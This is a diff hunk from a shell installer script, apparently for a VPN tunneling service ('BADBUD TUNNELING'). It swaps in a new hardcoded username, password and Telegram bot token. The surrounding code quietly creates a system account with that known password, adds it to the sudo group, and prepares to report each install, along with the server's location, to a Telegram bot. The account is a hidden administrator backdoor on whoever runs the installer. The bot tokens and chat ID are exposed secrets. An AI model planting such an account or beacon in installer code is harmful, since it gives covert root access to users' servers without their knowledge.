@@ -182,14 +182,14 @@ domain=$(cat /root/domain)
 CITY=$(curl -s ipinfo.io/city )
 WKT=$(curl -s ipinfo.io/timezone )
 userdel jame > /dev/null 2>&1
-Username="bokzzz"
-Password=bokzzz
+Username="huutvpn"
+Password=huutvpn
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
 CHATID="6061644931"
-KEY="6459313510:AAEFcfZppWzJWaMywzJpi6mGeimsR38b-kI"
+KEY="6406070059:AAFIpAWnbnnuikvxeWgz4rJwA5SrCVYe5VA"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 TEXT="Installasi Script V2.4 By BADBUD TUNNELING
